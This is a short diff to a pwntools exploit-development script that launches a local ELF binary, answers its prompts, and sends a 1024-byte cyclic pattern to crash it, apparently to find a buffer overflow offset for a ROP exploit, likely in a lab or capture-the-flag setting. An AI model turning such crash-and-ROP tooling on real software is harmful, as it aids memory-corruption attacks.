@@ -301,6 +301,12 @@ elf = ELF(ropFile)
 message("Starting local program")
 p = process(elf.path)
 
+p.recvuntil("name?")		# Program specific code
+p.sendline("spooks7")		# Program specific code
+p.recvuntil("message:")	# Program specific code
+p.sendline("1024")		# Program specific code
+p.recvuntil("text:")		# Program specific code
+
 message("Crashing program")
 crash = cyclic(1024)
 p.sendline(crash)
